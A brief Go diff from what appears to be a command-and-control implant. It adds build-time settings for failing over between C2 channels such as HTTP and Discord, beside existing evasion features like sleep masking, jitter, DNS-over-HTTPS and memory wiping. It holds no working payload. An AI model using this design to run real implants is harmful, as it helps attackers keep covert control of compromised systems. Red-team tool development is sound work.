@@ -62,6 +62,9 @@ var (
 	mtlsCertPEM            string = "" // Base64-encoded PEM client certificate for mutual TLS authentication
 	mtlsKeyPEM             string = "" // Base64-encoded PEM client private key for mutual TLS authentication
 	dohResolver            string = "" // DNS-over-HTTPS provider for all agent DNS: cloudflare, google, quad9, or custom URL
+	failoverChain          string = "" // Ordered failover profiles: e.g., "http,discord" (empty = single profile)
+	failoverThreshold      string = "" // Consecutive failures before switching profile (default: 5)
+	failoverRecovery       string = "" // Seconds between primary recovery attempts when on backup (default: 300)
 )
 
 // clearGlobals zeros out ALL build-time global variables after they have been
@@ -133,6 +136,9 @@ func clearGlobals() {
 	sleepMask = ""
 	jitterProfile = ""
 	dohResolver = ""
+	failoverChain = ""
+	failoverThreshold = ""
+	failoverRecovery = ""
 }
 
 // xorDecodeString decodes a base64-encoded XOR-encrypted string.
